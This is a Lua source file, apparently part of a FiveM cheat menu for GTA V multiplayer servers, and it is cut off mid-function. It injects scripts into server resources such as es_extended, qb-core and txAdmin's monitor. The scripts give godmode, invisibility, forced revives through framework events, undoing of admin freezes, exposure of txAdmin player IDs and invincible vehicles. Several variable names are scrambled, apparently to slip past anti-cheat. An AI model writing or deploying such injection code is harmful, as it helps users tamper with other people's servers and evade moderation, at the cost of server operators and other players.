_G.noclipSpeed = _G.noclipSpeed or 1.0
_G.noclipFollowHeading = _G.noclipFollowHeading or false
_G.invisible_noclip_mode = _G.invisible_noclip_mode or 0
_G.noRagdollActive = _G.noRagdollActive or false
_G.WavenoclipActive = _G.WavenoclipActive or false

-- Determine injection resource (like macho menu)
local InjectResource = nil
CreateThread(function()
    if GetResourceState("es_extended") == "started" then
        InjectResource = 'es_extended'
    elseif GetResourceState("ox_lib") == "started" then
        InjectResource = 'ox_lib'
    elseif GetResourceState("qb-core") == "started" then
        InjectResource = 'qb-core'
    elseif GetResourceState("oxmysql") == "started" then
        InjectResource = 'oxmysql'
    elseif GetResourceState("monitor") == "started" then
        InjectResource = 'monitor'
    else
        InjectResource = 'any'
    end
end)

-- Wait for InjectResource to be determined
CreateThread(function()
    while not InjectResource do Wait(100) end
end)

-- SELF
Utils.RegisterScript("frameworkRevive", [[
if GetResourceState('es_extended') == 'started' then
    TriggerEvent("esx_ambulancejob:revive")
    return
end
if GetResourceState('qb-core') == 'started' then
    TriggerEvent("hospital:client:Revive")
    return
end
if GetResourceState('wasabi_ambulance') == 'started' then
    TriggerEvent("wasabi_ambulance:revive")
    return
end
if GetResourceState('ak47_ambulancejob') == 'started' then
    TriggerEvent("ak47_ambulancejob:revive")
    return
end
if GetResourceState('ars_ambulancejob') == 'started' then
    TriggerEvent("ars_ambulancejob:healPlayer", {revive = true})
    return
end

local ped = PlayerPedId()
local pos = GetEntityCoords(ped)
local heading = GetEntityHeading(ped)
NetworkResurrectLocalPlayer(pos.x, pos.y, pos.z, heading, false, false)
ResurrectPed(ped)
SetEntityHealth(ped, GetEntityMaxHealth(ped))
ClearPedBloodDamage(ped)
RestorePlayerStamina(PlayerId(), 100.0)
print("hi")
]], "any")

Utils.RegisterScript("setHealth", [[
    local health = %s
    local ped = PlayerPedId()
    SetEntityHealth(ped, health)
    ClearPedBloodDamage(ped)
]], {"es_extended", "qb-core", "monitor"})

Utils.RegisterScript("setArmor", [[
    local health = %s
    local ped = PlayerPedId()
    SetPedArmour(ped, health)
]], {"es_extended", "qb-core", "monitor"})

Utils.RegisterScript("setGodmode", [[
    local toggle = not %s
    local ped = PlayerPedId()
    SetEntityCanBeDamaged(ped, toggle)
    SetEntityProofs(ped, true, true, true, false, true, false, false, false)
    SetEntityInvincible(ped, not toggle)
]], {"es_extended", "qb-core", "monitor"})

Utils.RegisterScript("setVisible", [[
    local toggle = not %s
    local ped = PlayerPedId()
    SetEntityVisible(ped, toggle, false)
]], {"es_extended", "qb-core", "monitor"})

Utils.RegisterScript("suicide", [[
    SetEntityHealth(PlayerPedId(), 0)
]], "any")

Utils.RegisterScript("SuperSpeed", [[
    local toggle = %s
    local playerId = PlayerId()

    if toggle then
        SetRunSprintMultiplierForPlayer(playerId, 1.49)
    else
        SetRunSprintMultiplierForPlayer(playerId, 1.0)
    end
]], "any")

Utils.RegisterScript("antiFreeze", [[
    local toggle = %s

    _G.aOIQWEJHBXJID = toggle
    if aOIQWEJHBXJID then
        CreateThread(function()
            while aOIQWEJHBXJID do
                if IsEntityPositionFrozen(PlayerPedId()) then
                    FreezeEntityPosition(PlayerPedId(), false)
                    ClearPedTasks(PlayerPedId())
                end
                Wait(0)
            end
        end)
    end
]], "any")

Utils.RegisterScript("forceMinimap", [[

    DisplayRadar(true)
]], "any")

Utils.RegisterScript("nativeRevive", [[
    local ped = PlayerPedId()
    local coords = GetEntityCoords(ped)
    local heading = GetEntityHeading(ped)

    NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, false, false)
    ResurrectPed(ped)
    ClearPedBloodDamage(ped)
    SetEntityHealth(ped, GetEntityMaxHealth(ped))
    SetPedArmour(ped, GetPlayerMaxArmour(PlayerId()) or 100)
    RestorePlayerStamina(PlayerId(), 100.0)
]], "any")

Utils.RegisterScript("showTxAdmin", [[
    local toggle = %s
    menuIsAccessible = true
    toggleShowPlayerIDs(toggle, true)
]], "any")

Utils.RegisterScript("toggleNoRagdoll", [[
    local enable = %s
    _G.noRagdollActive = enable

    if enable then
        if _G.noRagdollThread then return end
        _G.noRagdollThread = true

        CreateThread(function()
            while _G.noRagdollActive do
                local ped = PlayerPedId()
                SetPedCanRagdoll(ped, false)
                Wait(0)
            end
            SetPedCanRagdoll(PlayerPedId(), true)
            _G.noRagdollThread = nil
        end)
    else
        _G.noRagdollThread = nil
        SetPedCanRagdoll(PlayerPedId(), true)
    end
]], "any")

Utils.RegisterScript("randomOutfit", [[
    local ped = PlayerPedId()
    if ped == 0 then return end

    math.randomseed(GetGameTimer())

    local function randomDrawable(component, exclude)
        local total = GetNumberOfPedDrawableVariations(ped, component)
        if total <= 1 then return exclude or 0 end
        local choice = math.random(0, total - 1)
        if exclude ~= nil then
            local attempts = 0
            while choice == exclude and attempts < 10 do
                choice = math.random(0, total - 1)
                attempts = attempts + 1
            end
        end
        return choice
    end

    local function randomTexture(component, drawable)
        local total = GetNumberOfPedTextureVariations(ped, component, drawable)
        if total <= 1 then return 0 end
        return math.random(0, total - 1)
    end

    local function randomProp(propIndex)
        local total = GetNumberOfPedPropDrawableVariations(ped, propIndex)
        if total <= 0 then
            ClearPedProp(ped, propIndex)
            return
        end

        local drawable = math.random(0, total - 1)
        local texTotal = GetNumberOfPedPropTextureVariations(ped, propIndex, drawable)
        local texture = texTotal > 1 and math.random(0, texTotal - 1) or 0
        SetPedPropIndex(ped, propIndex, drawable, texture, true)
    end

    local torso = randomDrawable(11, 15)
    SetPedComponentVariation(ped, 11, torso, randomTexture(11, torso), 2)
    local legs = randomDrawable(4)
    SetPedComponentVariation(ped, 4, legs, randomTexture(4, legs), 2)
    local shoes = randomDrawable(6, 15)
    SetPedComponentVariation(ped, 6, shoes, randomTexture(6, shoes), 2)
    SetPedComponentVariation(ped, 8, 15, 0, 2)
    SetPedComponentVariation(ped, 3, randomDrawable(3), 0, 2)

    local face = math.random(0, 45)
    local skin = math.random(0, 45)
    SetPedHeadBlendData(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

    local hairMax = GetNumberOfPedDrawableVariations(ped, 2)
    local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
    SetPedComponentVariation(ped, 2, hair, randomTexture(2, hair), 2)
    SetPedHairColor(ped, math.random(0, 3), math.random(0, 3))

    local browCount = GetNumHeadOverlayValues(2)
    local brows = browCount > 1 and math.random(0, browCount - 1) or 0
    SetPedHeadOverlay(ped, 2, brows, 1.0)
    SetPedHeadOverlayColor(ped, 2, 1, math.random(0, 3), math.random(0, 3))

    ClearPedProp(ped, 0)
    ClearPedProp(ped, 1)
    randomProp(0)
    randomProp(1)
]], "any")

-----------------------------------------
Utils.RegisterScript("repairVehicle", [[
local ped = PlayerPedId()
local veh = GetVehiclePedIsIn(ped, false)

if veh ~= 0 then
    SetVehicleFixed(veh)
    SetVehicleDeformationFixed(veh)
    SetVehicleUndriveable(veh, false)
    SetVehicleEngineOn(veh, true, true)
end
]])

Utils.RegisterScript("maxUpgradeVehicle", [[
local ped = PlayerPedId()
local veh = GetVehiclePedIsIn(ped, false)

if veh ~= 0 then
    SetVehicleModKit(veh, 0)

    SetVehicleMod(veh, 11, GetNumVehicleMods(veh, 11) - 1, false)
    SetVehicleMod(veh, 12, GetNumVehicleMods(veh, 12) - 1, false)
    SetVehicleMod(veh, 13, GetNumVehicleMods(veh, 13) - 1, false)
    SetVehicleMod(veh, 15, GetNumVehicleMods(veh, 15) - 1, false)
    SetVehicleMod(veh, 16, GetNumVehicleMods(veh, 16) - 1, false)

    ToggleVehicleMod(veh, 18, true)

    ToggleVehicleMod(veh, 22, true)

    for i = 0, 49 do
        local modCount = GetNumVehicleMods(veh, i)
        if modCount > 0 then
            SetVehicleMod(veh, i, modCount - 1, false)
        end
    end

    SetVehicleWindowTint(veh, 1)
end
]])

Utils.RegisterScript("cleanVehicle", [[
local ped = PlayerPedId()
local veh = GetVehiclePedIsIn(ped, false)

if veh ~= 0 then
    SetVehicleDirtLevel(veh, 0.0)
    WashDecalsFromVehicle(veh, 1.0)
end
]])

Utils.RegisterScript("setVehicleInvincible", [[
local ped = PlayerPedId()
local veh = GetVehiclePedIsIn(ped, false)
local toggle = %s

if veh ~= 0 then
    SetEntityInvincible(veh, toggle)
    SetVehicleCanBeVisiblyDamaged(veh, not toggle)
    SetVehicleCanBreak(veh, not toggle)
    SetEntityProofs(veh, toggle, toggle, toggle, toggle, toggle, toggle, toggle, toggle)
end
]])

Utils.RegisterScript("setInfiniteFuel", [[
_G.JIXHUWASDBNBDASDASXPQWE = %s

CreateThread(function()
    while JIXHUWASDBNBDASDASXPQWE do
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh and veh ~= 0 then
            SetVehicleFuelLevel(veh, 100)
        end
        Wait(1000)
    end
end)
]])

Utils.RegisterScript("setEnginePower", [[
_G.JIXHUWASDBNBDASDASXPQWE = %s

CreateThread(function()
    while JIXHUWASDBNBDASDASXPQWE do
        local ped = PlayerPedId()
        local veh = GetVehiclePedIsIn(ped, false)
        if veh ~= 0 then
            SetVehicleStrong(veh, true)
            SetVehicleGravityAmount(veh, 60.0)
        end

        Wait(0)
    end

    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, false)
    if veh ~= 0  then
        SetVehicleStrong(veh, false)
        SetVehicleGravityAmount(veh, 9.8)
    end
end)
]], "monitor")

Utils.RegisterScript("printAllCustomCars", [[

local defaultVehicles = {

    ["stunt"]=true,["avisa"]=true,["ninef"]=true,["supervolito"]=true,["thrax"]=true,

    ["buffalo2"]=true,["armytrailer2"]=true,["ninef2"]=true,["riot"]=true,["driftjester"]=true,

    ["blazer2"]=true,["blista"]=true,["jester"]=true,["asea"]=true,["asea2"]=true,

    ["tornado4"]=true,["armytanker"]=true,["z190"]=true,["barracks3"]=true,["verus"]=true,

    ["dilettante2"]=true,["issi6"]=true,["cogcabrio"]=true,["cheetah2"]=true,["turismor"]=true,

    ["revolter"]=true,["bus"]=true,["boattrailer"]=true,["flatbed"]=true,["buffalo"]=true,

    ["ambulance"]=true,["benson"]=true,["armytrailer"]=true,["freighttrailer"]=true,["bullet"]=true,

    ["boxville2"]=true,["coach"]=true,["bati"]=true,["boor"]=true,["blazer"]=true,

    ["btype3"]=true,["stratum"]=true,["airbus"]=true,["slamvan2"]=true,["massacro"]=true,

    ["cuban800"]=true,["toro2"]=true,["Novak"]=true,["burrito4"]=true,["tanker2"]=true,

    ["asterope"]=true,["airtug"]=true,["glendale"]=true,["caracara2"]=true,["barracks"]=true,

    ["gresley"]=true,["cavalcade"]=true,["handler"]=true,["barracks2"]=true,["towtruck2"]=true,

    ["romero"]=true,["innovation"]=true,["asterope2"]=true,["bjxl"]=true,["baller"]=true,

    ["pony"]=true,["voltic"]=true,["baller2"]=true,["docktug"]=true,["banshee"]=true,

    ["driftremus"]=true,["winky"]=true,["longfin"]=true,["cargoplane"]=true,["brickade"]=true,

    ["bfinjection"]=true,["felon2"]=true,["biff"]=true,["nightshark"]=true,["voltic2"]=true,

    ["blazer3"]=true,["barrage"]=true,["burrito2"]=true,["velum2"]=true,["bison"]=true,

    ["bison2"]=true,["tyrant"]=true,["bison3"]=true,["caddy2"]=true,["caddy"]=true,

    ["cavalcade2"]=true,["boxville"]=true,["seminole"]=true,["boxville3"]=true,["zeno"]=true,

    ["bobcatxl"]=true,["comet2"]=true,["bodhi2"]=true,["blimp2"]=true,["buccaneer"]=true,

    ["bulldozer"]=true,["hauler2"]=true,["vigilante"]=true,["blimp"]=true,["zentorno"]=true,

    ["phantom4"]=true,["burrito"]=true,["camper"]=true,["cheetah"]=true,["speeder2"]=true,

    ["clique"]=true,["burrito3"]=true,["wolfsbane"]=true,["dilettante"]=true,["exemplar"]=true,

    ["scrap"]=true,["komoda"]=true,["burrito5"]=true,["manana"]=true,["policet"]=true,

    ["mule3"]=true,["tornado"]=true,["hexer"]=true,["tyrus"]=true,["tampa3"]=true,

    ["gburrito"]=true,["cablecar"]=true,["pipistrello"]=true,["ruffian"]=true,["niobe"]=true,

    ["omnisegt"]=true,["carbonizzare"]=true,["fq2"]=true,["coquette"]=true,["tiptruck"]=true,

    ["docktrailer"]=true,["cutter"]=true,["phantom"]=true,["futo"]=true,["dune"]=true,

    ["dune2"]=true,["faggio3"]=true,["fusilade"]=true,["predator"]=true,["terminus"]=true,

    ["hotknife"]=true,["hustler"]=true,["dloader"]=true,["tribike3"]=true,["dubsta"]=true,

    ["vigero"]=true,["ruiner2"]=true,["vigero2"]=true,["dubsta2"]=true,["draugur"]=true,

    ["dump"]=true,["slamvan3"]=true,["everon2"]=true,["alphaz1"]=true,["rubble"]=true,

    ["slamvan6"]=true,["dominator"]=true,["fixter"]=true,["veto"]=true,["emperor"]=true,

    ["habanero"]=true,["emperor2"]=true,["emperor3"]=true,["brutus3"]=true,["tornado3"]=true,

    ["shamal"]=true,["entityxf"]=true,["elegy2"]=true,["peyote"]=true,["tvtrailer"]=true,

    ["rt3000"]=true,["f620"]=true,["picador"]=true,["fbi"]=true,["tampa"]=true,

    ["fbi2"]=true,["thrust"]=true,["buffalo3"]=true,["felon"]=true,["sandking"]=true,

    ["stingergt"]=true,["seashark3"]=true,["feltzer2"]=true,["firetruk"]=true,["forklift"]=true,

    ["fugitive"]=true,["tr4"]=true,["shinobi"]=true,["granger"]=true,["adder"]=true,

    ["corsita"]=true,["gauntlet"]=true,["hauler"]=true,["caddy3"]=true,["retinue2"]=true,

    ["infernus"]=true,["freightcont1"]=true,["ingot"]=true,["tr2"]=true,["scorcher"]=true,

    ["intruder"]=true,["issi2"]=true,["surge"]=true,["visione"]=true,["stretch"]=true,

    ["ztype"]=true,["Jackal"]=true,["panthere"]=true,["journey"]=true,["jb700"]=true,

    ["carbonrs"]=true,["khamelion"]=true,["jester4"]=true,["issi4"]=true,["phantom3"]=true,

    ["landstalker"]=true,["suntrap"]=true,["raiden"]=true,["lguard"]=true,["mesa"]=true,

    ["luxor"]=true,["issi5"]=true,["swift"]=true,["policet3"]=true,["mesa2"]=true,

    ["mesa3"]=true,["manana2"]=true,["crusader"]=true,["minivan"]=true,["mixer"]=true,

    ["mixer2"]=true,["monroe"]=true,["mower"]=true,["rebel"]=true,["mule"]=true,

    ["pounder2"]=true,["faction"]=true,["mule2"]=true,["monster"]=true,["sanchez"]=true,

    ["oracle"]=true,["oracle2"]=true,["packer"]=true,["blazer5"]=true,["patriot"]=true,

    ["brioso2"]=true,["sabregt2"]=true,["patrolboat"]=true,["pbus"]=true,["tornado2"]=true,

    ["sadler2"]=true,["cruiser"]=true,["penumbra"]=true,["benson2"]=true,["phoenix"]=true,

    ["pounder"]=true,["savage"]=true,["freightgrain"]=true,["trflat"]=true,["verlierer2"]=true,

    ["police"]=true,["maverick"]=true,["police4"]=true,["sultanrs"]=true,["police2"]=true,

    ["police3"]=true,["sheava"]=true,["policeold1"]=true,["torero"]=true,["tigon"]=true,

    ["policeold2"]=true,["pony2"]=true,["prairie"]=true,["virgo3"]=true,["ratloader2"]=true,

    ["pranger"]=true,["premier"]=true,["seasparrow3"]=true,["primo"]=true,["regina"]=true,

    ["proptrailer"]=true,["nero"]=true,["trailers"]=true,["rancherxl"]=true,["contender"]=true,

    ["rancherxl2"]=true,["flashgt"]=true,["rapidgt"]=true,["towtruck"]=true,["rapidgt2"]=true,

    ["baletrailer"]=true,["trailerlogs"]=true,["radi"]=true,["cargobob3"]=true,["deveste"]=true,

    ["taipan"]=true,["ratloader"]=true,["rebel2"]=true,["miljet"]=true,["rentalbus"]=true,

    ["cerberus2"]=true,["ruiner"]=true,["rumpo"]=true,["rumpo2"]=true,["rhino"]=true,

    ["alpha"]=true,["youga2"]=true,["ripley"]=true,["schafter4"]=true,["voodoo2"]=true,

    ["rocoto"]=true,["schlagen"]=true,["submersible"]=true,["bruiser3"]=true,["sabregt"]=true,

    ["sadler"]=true,["cerberus3"]=true,["sandking2"]=true,["vagrant"]=true,["schafter2"]=true,

    ["freight"]=true,["coquette3"]=true,["schwarzer"]=true,["lynx"]=true,["sentinel"]=true,

    ["buzzard"]=true,["patriot3"]=true,["sentinel2"]=true,["zion"]=true,["taxi"]=true,

    ["police5"]=true,["outlaw"]=true,["tractor2"]=true,["zion2"]=true,["annihilator2"]=true,

    ["serrano"]=true,["sheriff"]=true,["sc1"]=true,["sheriff2"]=true,["comet7"]=true,

    ["speedo"]=true,["speedo2"]=true,["stanier"]=true,["freight2"]=true,["stinger"]=true,

    ["superd"]=true,["stockade"]=true,["tvtrailer2"]=true,["impaler2"]=true,["stockade3"]=true,

    ["technical"]=true,["elegy"]=true,["sultan"]=true,["surano"]=true,["surfer"]=true,

    ["surfer2"]=true,["taco"]=true,["tailgater"]=true,["gargoyle"]=true,["manchez2"]=true,

    ["tr3"]=true,["trash"]=true,["rapidgt3"]=true,["tractor"]=true,["tractor3"]=true,

    ["graintrailer"]=true,["tulip2"]=true,["tiptruck2"]=true,["tourbus"]=true,["oppressor"]=true,

    ["utillitruck"]=true,["seashark"]=true,["utillitruck2"]=true,["chernobog"]=true,["utillitruck3"]=true,

    ["slamvan"]=true,["BMX"]=true,["fagaloa"]=true,["policeb"]=true,["washington"]=true,

    ["youga"]=true,["avarus"]=true,["panto"]=true,["brutus2"]=true,["sanchez2"]=true,

    ["tribike"]=true,["hydra"]=true,["chino"]=true,["cargobob4"]=true,["tribike2"]=true,

    ["penetrator"]=true,["yosemite"]=true,["akuma"]=true,["pcj"]=true,["vacca"]=true,

    ["paradise"]=true,["coureur"]=true,["bagger"]=true,["bati2"]=true,["daemon"]=true,

    ["annihilator"]=true,["phantom2"]=true,["double"]=true,["tankercar"]=true,["vader"]=true,

    ["trailersmall"]=true,["toros"]=true,["faggio2"]=true,["buzzard2"]=true,["t20"]=true,

    ["technical3"]=true,["cargobob"]=true,["trailersmall2"]=true,["Dynasty"]=true,["cargobob2"]=true,

    ["skylift"]=true,["polmav"]=true,["nemesis"]=true,["frogger"]=true,["dinghy"]=true,

    ["dubsta3"]=true,["jubilee"]=true,["sultan3"]=true,["frogger2"]=true,["bestiagts"]=true,

    ["huntley"]=true,["duster"]=true,["mammatus"]=true,["yosemite3"]=true,["jet"]=true,

    ["osiris"]=true,["entity3"]=true,["titan"]=true,["insurgent2"]=true,["lazer"]=true,

    ["daemon2"]=true,["squalo"]=true,["marquis"]=true,["dinghy2"]=true,["Lurcher"]=true,

    ["jetmax"]=true,["tropic"]=true,["driftcypher"]=true,["youga4"]=true,["seashark2"]=true,

    ["dukes2"]=true,["freightcar"]=true,["freightcont2"]=true,["metrotrain"]=true,["trailers2"]=true,

    ["trailers3"]=true,["raketrailer"]=true,["fcr"]=true,["fcr2"]=true,["tanker"]=true,

    ["guardian"]=true,["velum"]=true,["italigtb2"]=true,["rebla"]=true,["bifta"]=true,

    ["speeder"]=true,["dune5"]=true,["impaler5"]=true,["paragon2"]=true,["chino2"]=true,

    ["warrener"]=true,["kalahari"]=true,["slamvan5"]=true,["btype"]=true,["hakuchou2"]=true,

    ["gt500"]=true,["vestra"]=true,["prototipo"]=true,["diablous2"]=true,["rhapsody"]=true,

    ["blade"]=true,["pigalle"]=true,["sovereign"]=true,["nimbus"]=true,["pfister811"]=true,

    ["besra"]=true,["cinquemila"]=true,["coquette2"]=true,["trophytruck"]=true,["hakuchou"]=true,

    ["faggio"]=true,["driftfr36"]=true,["furoregt"]=true,["jester2"]=true,["massacro2"]=true,

    ["conada"]=true,["youga3"]=true,["casco"]=true,["boxville4"]=true,["insurgent"]=true,

    ["technical2"]=true,["halftrack"]=true,["hellion"]=true,["gburrito2"]=true,["dinghy3"]=true,

    ["enduro"]=true,["lectro"]=true,["champion"]=true,["krieger"]=true,["kuruma"]=true,

    ["kuruma2"]=true,["trophytruck2"]=true,["dominator6"]=true,["trash2"]=true,["everon"]=true,

    ["limo2"]=true,["zr3803"]=true,["valkyrie"]=true,["swift2"]=true,["luxor2"]=true,

    ["feltzer3"]=true,["boxville5"]=true,["virgo"]=true,["buffalo5"]=true,["brigham"]=true,

    ["windsor"]=true,["vindicator"]=true,["bf400"]=true,["brawler"]=true,["stalion"]=true,

    ["previon"]=true,["toro"]=true,["tampa2"]=true,["turismo3"]=true,["faction2"]=true,

    ["moonbeam"]=true,["penumbra2"]=true,["moonbeam2"]=true,["gauntlet4"]=true,["comet3"]=true,

    ["brickade2"]=true,["futo2"]=true,["primo2"]=true,["specter2"]=true,["buccaneer2"]=true,

    ["voodoo"]=true,["btype2"]=true,["trailerlarge"]=true,["cog55"]=true,["nightshade"]=true,

    ["broadway"]=true,["seven70"]=true,["mamba"]=true,["schafter3"]=true,["windsor2"]=true,

    ["calico"]=true,["asbo"]=true,["schafter5"]=true,["schafter6"]=true,["cog552"]=true,

    ["cognoscenti"]=true,["gauntlet5"]=true,["cognoscenti2"]=true,["esskey"]=true,["vectre"]=true,

    ["baller3"]=true,["squaddie"]=true,["baller4"]=true,["bombushka"]=true,["jester3"]=true,

    ["baller5"]=true,["baller6"]=true,["dinghy4"]=true,["ruston"]=true,["tropic2"]=true,

    ["supervolito2"]=true,["valkyrie2"]=true,["banshee2"]=true,["faction3"]=true,["minivan2"]=true,

    ["tornado5"]=true,["l35"]=true,["virgo2"]=true,["xls"]=true,["xls2"]=true,

    ["fmj"]=true,["rumpo3"]=true,["ellie"]=true,["volatus"]=true,["reaper"]=true,

    ["tug"]=true,["diablous"]=true,["omnis"]=true,["le7b"]=true,["rallytruck"]=true,

    ["cliffhanger"]=true,["tropos"]=true,["brioso"]=true,["bruiser2"]=true,["tornado6"]=true,

    ["scarab2"]=true,["raptor"]=true,["chimera"]=true,["vortex"]=true,["sanctus"]=true,

    ["nightblade"]=true,["zombiea"]=true,["zombieb"]=true,["defiler"]=true,["comet6"]=true,

    ["ratbike"]=true,["stafford"]=true,["shotaro"]=true,["r300"]=true,["hermes"]=true,

    ["manchez"]=true,["cypher"]=true,["blazer4"]=true,["dinghy5"]=true,["tempesta"]=true,

    ["italigtb"]=true,["pizzaboy"]=true,["nero2"]=true,["specter"]=true,["monster4"]=true,

    ["dune4"]=true,["wastelander"]=true,["ruiner3"]=true,["turismo2"]=true,["infernus2"]=true,

    ["neo"]=true,["gp1"]=true,["trailers4"]=true,["tenf2"]=true,["xa21"]=true,

    ["weevil2"]=true,["vagner"]=true,["scarab3"]=true,["insurgent3"]=true,["apc"]=true,

    ["blista3"]=true,["dune3"]=true,["ardent"]=true,["seabreeze"]=true,["tula"]=true,

    ["havok"]=true,["hunter"]=true,["openwheel1"]=true,["microlight"]=true,["gb200"]=true,

    ["rogue"]=true,["vetir"]=true,["pyro"]=true,["howard"]=true,["stalion2"]=true,

    ["mogul"]=true,["starling"]=true,["nokota"]=true,["molotok"]=true,["retinue"]=true,

    ["cyclone"]=true,["viseris"]=true,["comet5"]=true,["riata"]=true,["autarch"]=true,

    ["savestra"]=true,["comet4"]=true,["neon"]=true,["sentinel3"]=true,["khanjali"]=true,

    ["volatol"]=true,["akula"]=true,["deluxo"]=true,["stromberg"]=true,["riot2"]=true,

    ["avenger"]=true,["avenger2"]=true,["formula2"]=true,["thruster"]=true,["polgreenwood"]=true,

    ["deathbike3"]=true,["streiter"]=true,["pariah"]=true,["kamacho"]=true,["entity2"]=true,

    ["remus"]=true,["cheburek"]=true,["astron"]=true,["zr380"]=true,["impaler3"]=true,

    ["caracara"]=true,["hotring"]=true,["seasparrow"]=true,["michelli"]=true,["dominator3"]=true,

    ["tezeract"]=true,["issi3"]=true,["deity"]=true,["scramjet"]=true,["strikeforce"]=true,

    ["terbyte"]=true,["pbus2"]=true,["oppressor2"]=true,["towtruck3"]=true,["speedo4"]=true,

    ["freecrawler"]=true,["monstrociti"]=true,["mule4"]=true,["menacer"]=true,["blimp3"]=true,

    ["swinger"]=true,["italigto"]=true,["patriot2"]=true,["monster5"]=true,["deathbike2"]=true,

    ["impaler4"]=true,["slamvan4"]=true,["brutus"]=true,["deathbike"]=true,["dominator4"]=true,

    ["seminole2"]=true,["dominator5"]=true,["mule5"]=true,["bruiser"]=true,["rcbandito"]=true,

    ["blista2"]=true,["cerberus"]=true,["monster3"]=true,["tulip"]=true,["zhaba"]=true,

    ["scarab"]=true,["vamos"]=true,["imperator"]=true,["imperator2"]=true,["imperator3"]=true,

    ["deviant"]=true,["impaler"]=true,["zr3802"]=true,["paragon"]=true,["jugular"]=true,

    ["rrocket"]=true,["peyote2"]=true,["s80"]=true,["zorrusso"]=true,["glendale2"]=true,

    ["issi7"]=true,["locust"]=true,["emerus"]=true,["gauntlet3"]=true,["nebula"]=true,

    ["zion3"]=true,["drafter"]=true,["minitank"]=true,["yosemite2"]=true,["driftyosemite"]=true,

    ["Stryder"]=true,["jb7002"]=true,["sultan2"]=true,["Sugoi"]=true,["formula"]=true,

    ["furia"]=true,["vstr"]=true,["gauntlet6"]=true,["kanjo"]=true,["imorgon"]=true,

    ["coquette4"]=true,["landstalker2"]=true,["club"]=true,["dukes3"]=true,["openwheel2"]=true,

    ["peyote3"]=true,["veto2"]=true,["italirsx"]=true,["toreador"]=true,["slamtruck"]=true,

    ["weevil"]=true,["polimpaler6"]=true,["alkonost"]=true,["seasparrow2"]=true,["kosatka"]=true,

    ["freightcar2"]=true,["dominator7"]=true,["dominator8"]=true,["euros"]=true,["tailgater2"]=true,

    ["ratel"]=true,["growler"]=true,["zr350"]=true,["warrener2"]=true,["reever"]=true,

    ["iwagen"]=true,["sentinel4"]=true,["baller7"]=true,["buffalo4"]=true,["ignus"]=true,

    ["granger2"]=true,["ruiner4"]=true,["brioso3"]=true,["kanjosj"]=true,["postlude"]=true,

    ["torero2"]=true,["lm87"]=true,["tenf"]=true,["rhinehart"]=true,["greenwood"]=true,

    ["sm722"]=true,["tahoma"]=true,["issi8"]=true,["virtue"]=true,["eudora"]=true,

    ["powersurge"]=true,["journey2"]=true,["manchez3"]=true,["surfer3"]=true,["cargoplane2"]=true,

    ["inductor2"]=true,["inductor"]=true,["raiju"]=true,["stingertt"]=true,["clique2"]=true,

    ["streamer216"]=true,["avenger3"]=true,["avenger4"]=true,["speedo5"]=true,["conada2"]=true,

    ["vivanite"]=true,["impaler6"]=true,["dorado"]=true,["towtruck4"]=true,["gauntlet2"]=true,

    ["Vigero3"]=true,["cavalcade3"]=true,["envisage"]=true,["driftfuto"]=true,["drifteuros"]=true,

    ["drifttampa"]=true,["driftzr350"]=true,["aleutian"]=true,["dominator9"]=true,["polgauntlet"]=true,

    ["boxville6"]=true,["fr36"]=true,["trailers5"]=true,["baller8"]=true,["boattrailer2"]=true,

    ["boattrailer3"]=true,["poldominator10"]=true,["yosemite1500"]=true,["poldorado"]=true,["paragon3"]=true,

    ["eurosX32"]=true,["castigator"]=true,["dominator10"]=true,["polimpaler5"]=true,["driftnebula"]=true,

    ["driftsentinel"]=true,["vorschlaghammer"]=true,["coquette5"]=true,["driftvorschlag"]=true,["submersible2"]=true,

    ["dukes"]=true,["dominator2"]=true,["dodo"]=true,["svolito"]=true,["buffalo02"]=true,["dilettan"]=true,["cogcabri"]=true,["ambulan"]=true,

["freighttrai"]=true,["roosevelt2"]=true,["novak"]=true,["astrope"]=true,["cavcade"]=true,

["cargopl"]=true,["bfinject"]=true,["blazer03"]=true,["buccanee"]=true,["bulldoze"]=true,

["carboniz"]=true,["dominato"]=true,["trailer"]=true,["stingerg"]=true,["feltzer"]=true,

["fork"]=true,["jackal"]=true,["carbon"]=true,["khamel"]=true,["landstal"]=true,

["rebel01"]=true,["sanchez01"]=true,["verlier"]=true,["policeo1"]=true,["policeo2"]=true,

["rloader2"]=true,["sparrow3"]=true,["rancherx"]=true,["rloader"]=true,["rebel02"]=true,

["rentbus"]=true,["submers"]=true,["sandkin2"]=true,["schafter"]=true,["schwarze"]=true,

["annihlator2"]=true,["tailgate"]=true,["graintraile"]=true,["utiltruc"]=true,["bmx"]=true,

["washingt"]=true,["sanchez02"]=true,["annihl"]=true,["trsmall2"]=true,["dynasty"]=true,

["lurcher"]=true,["roosevelt"]=true,["trophy"]=true,["faggion"]=true,["furore"]=true,

["trophy2"]=true,["buccanee2"]=true,["trlarge"]=true,["niteshad"]=true,["cognosc"]=true,

["cognosc2"]=true,["svolito2"]=true,["valkyri2"]=true,["wastlndr"]=true,["polgreenw"]=true,

["sparrow"]=true,["driftyosem"]=true,["stryder"]=true,["sugoi"]=true,["landstlkr2"]=true,

["sparrow2"]=true,["vigero3"]=true,["poldom10"]=true,["yosemite4"]=true,["eurosx32"]=true,

["driftsent"]=true,["vorschlag"]=true,["driftvorsch"]=true,["submers2"]=true,["dominato2"]=true,["marshall"]=true

}

CreateThread(function()
    local allModels = GetAllVehicleModels()
    local foundAny = false

    for _, modelHash in ipairs(allModels) do

        local model = GetDisplayNameFromVehicleModel(modelHash):lower()

        if not defaultVehicles[model] then

            print("Found:", model)
            foundAny = true

        end

    end
    
    if not foundAny then
        print("No custom vehicles found")
    end
end)
]])

Utils.RegisterScript("setShiftBoost", [[
    QwErTyUiOpSh = %s
    if not QwErTyUiOpSh then return end
    if ShiftBoostSpeed == nil then ShiftBoostSpeed = 150.0 end
    
    local function ZxCvBnMmLl()
        local aAaBbCcDdEe = CreateThread
        local fFfGgGgHhIi = Wait
        local jJkKlLmMnNo = PlayerPedId
        local pPqQrRsStTu = IsPedInAnyVehicle
        local vVwWxXyYzZa = GetVehiclePedIsIn
        local bBcCdDeEfFg = IsDisabledControlJustPressed
        local sSeEtTvVbBn = SetVehicleForwardSpeed
        aAaBbCcDdEe(function()
            while QwErTyUiOpSh and not Unloaded do
                local _ped = jJkKlLmMnNo()
                if pPqQrRsStTu(_ped, false) then
                    local _veh = vVwWxXyYzZa(_ped, false)
